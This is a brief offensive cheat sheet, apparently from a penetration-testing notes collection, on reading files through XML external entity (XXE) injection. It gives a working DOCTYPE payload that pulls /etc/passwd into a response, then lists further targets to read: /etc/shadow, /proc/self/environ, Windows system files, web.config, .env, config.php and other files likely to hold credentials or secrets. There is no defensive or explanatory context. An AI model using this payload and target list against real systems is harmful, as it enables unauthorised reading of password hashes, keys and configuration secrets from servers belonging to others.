# File Read via XXE

## Basic Payload

<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

Use:

&xxe;

---

## Linux Targets

/etc/passwd

/etc/shadow

/etc/hostname

/proc/self/environ

---

## Windows Targets

C:/Windows/win.ini

C:/Windows/System32/drivers/etc/hosts

web.config

---

## Application Targets

.env

config.php

application.properties

settings.py